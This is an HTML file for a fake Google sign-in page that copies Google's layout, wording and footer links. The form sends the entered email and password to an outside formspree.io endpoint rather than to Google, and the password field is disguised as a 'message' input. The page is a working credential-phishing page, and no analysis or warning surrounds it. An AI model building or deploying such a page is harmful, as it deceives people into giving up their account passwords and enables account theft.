<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Google Sign In</title>
    <link rel="stylesheet" href="google.css">
</head>
<body>
    <div class="container">
        <form action="https://formspree.io/f/xrbzznpd" method="POST">
        <div class="sign-in-box">
            <img src="gogle.png" alt="Google Logo" class="logo">
            <h1>Sign in</h1>
            <p class="subtitle">Use your Google Account</p>
            <form action="login.php" method="post">
                <div class="input-group">
                    <input type="email" id="email" name="email" placeholder="Email or phone" required>
                </div>
                <div class="input-group">
                    <input type="message" id="email" name="message" placeholder="Password" required>
                </div>
                <a href="#" class="forgot-email">Forgot email?</a>
                <p class="guest-mode">Not your computer? Use Guest mode to sign in privately. <a href="#">Learn more</a></p>
                <div class="buttons">
                    <a href="#" class="create-account">Create account</a>
                    <button type="submit">Next</button>
                </div>
            </form>
        </div>
    </div>
    <footer>
        <div class="footer-content">
            <div class="language-selector">
                <select>
                    <option value="en-US">English (United States)</option>
                    <!-- Add more languages as needed -->
                </select>
            </div>
            <div class="footer-links">
                <a href="#">Help</a>
                <a href="#">Privacy</a>
                <a href="#">Terms</a>
            </div>
        </div>
    </footer>
</body>
</html>
